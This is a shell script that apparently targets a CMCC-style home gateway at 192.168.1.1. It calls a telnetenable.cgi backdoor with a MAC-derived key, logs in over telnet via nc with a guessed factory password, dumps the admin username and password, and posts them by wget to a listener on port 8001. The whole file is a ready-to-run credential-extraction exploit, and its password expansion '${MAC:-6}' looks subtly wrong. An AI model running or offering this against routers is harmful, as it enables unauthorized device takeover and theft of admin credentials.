#!/bin/sh
url_encode() {
	local input="$1"
	local output=""
	i=0
	len=$(expr length "$input")
	while [ $i -lt $len ]; do
		c=$(expr substr "$input" $(expr $i + 1) 1)
		case $c in
			[a-zA-Z0-9._~-]) output="$output$c" ;;
			' ') output="$output%20" ;;
			*) output="$output$(printf '%%%02X' "'$c")" ;;
		esac
		i=$(expr $i + 1)
	done
	echo "$output"
}
MAC=FFFFFFFFFFFF
AA=$(wget -O- -q -T 10 "http://192.168.1.1/cgi-bin/telnetenable.cgi?telnetenable=1&key=$MAC" | grep telnet | wc -l )
if [ $AA -eq 1 ]; then
	{
		sleep 1
		echo "admin"
		sleep 1
		echo "Fh@${MAC:-6}"
		sleep 1
		echo "load_cli factory"
		sleep 1
		echo "show admin_name"
		sleep 1
		echo "show admin_pwd" 
		sleep 1
		echo "exit"
		sleep 1
		echo "exit"
	} | nc 192.168.1.1 23 | tee /tmp/nc_result.log
	msg=$(cat /tmp/nc_result.log | grep -E "admin_(\S)+=" | sed ':a;N;$!ba;s/\n/,/g' )
	if [ "$msg" != "" ]; then
		if [ -f /tmp/CMCCAdmin.log ]; then
			Old_msg=$(cat /tmp/CMCCAdmin.log)
		else 
			Old_msg=""
		fi
		if [ "$msg" != "$Old_msg" ]; then
			msg_encoded=$(url_encode "$msg")
			wget -O- -q -T 10 "http://192.168.1.1:8001/?usr=test&from=test&msg=$msg_encoded"
			echo $msg > /tmp/CMCCAdmin.log
		fi
	fi
else
	echo "Can not connect CMCCAdmin"
fi

